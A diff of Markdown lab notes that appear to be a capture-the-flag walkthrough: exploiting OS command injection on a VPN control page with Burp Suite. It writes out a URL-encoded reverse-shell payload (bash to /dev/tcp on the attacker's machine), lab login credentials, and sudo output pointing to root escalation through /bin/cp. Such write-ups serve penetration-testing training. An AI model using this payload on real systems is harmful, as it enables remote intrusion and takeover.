@@ -6,16 +6,21 @@ nc -lvnp 1337
 
 
 ## Burp Suite OS Command Injection
-- Visit http://10.200.X.12/vpncontrol.php. You can get the IP from the VPN connection request.
-	- TCPv4_CLIENT link remote: [AF_INET]**10.200.118.12**:1194
-
+- Visit http://10.200.X.12/. You can get the IP from the VPN connection request.
+	![[Reverse Shell-20240704140243868.webp]]
+- Enter the following credentials:
+	- User: laura.wood%40corp.thereserve.loc
+	- Password: Password1@
 - Click on the "Submit" button and send it to Proxy.
+	![[Reverse Shell-20240704140643435.webp]]
+- Click on submit.
 - Send the request to "Repeater".
-- Add the following code to the request:
+- Add the following code to the request: 
 ```
 	+%26%26+bash+-i+>%26+/dev/tcp/<KALI MACHINE IP>/1337+0>%261
 ```
-![[burp_vpn.png]]
+
+![[Reverse Shell-20240704142326775.webp]]
 
 - Send the request.
 - You'll get a reverse shell on your netccat listener.
@@ -44,6 +49,7 @@ nc -lvnp 1337
 In summary, the command appears to be attempting to establish a network connection to the specified IP address and port while also launching an interactive Bash shell.
 
 ### Sanitize the shell
+To display the current user's sudo privileges. It shows which commands the user is allowed to run with sudo and any restrictions that may apply.
 **Victim**
 
 ```
@@ -65,3 +71,4 @@ www-data@ip-10-200-113-12:/var/www/html$ sudo -l
 User www-data may run the following commands on ip-10-200-113-12:  
 (root) NOPASSWD: /home/ubuntu/openvpn-createuser.sh, **/bin/cp**
 
+Next step: [[Connect via SSH (10.200.X.12)]]
